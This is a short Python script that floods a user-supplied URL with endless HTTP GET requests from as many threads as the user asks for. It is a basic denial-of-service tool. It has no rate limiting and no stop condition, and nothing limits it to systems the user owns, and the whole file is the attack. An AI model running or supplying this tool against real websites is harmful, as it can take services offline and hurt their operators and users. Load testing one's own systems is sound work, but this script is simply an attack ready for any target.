import requests
import threading

def send_request(target):
    while True:
        try:
            response = requests.get(target)
            print(f"Request sent to {target}. Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

target = input("Enter the target URL: ")
num_threads = int(input("Enter the number of threads: "))

for _ in range(num_threads):
    thread = threading.Thread(target=send_request, args=(target,))
    thread.start()
              
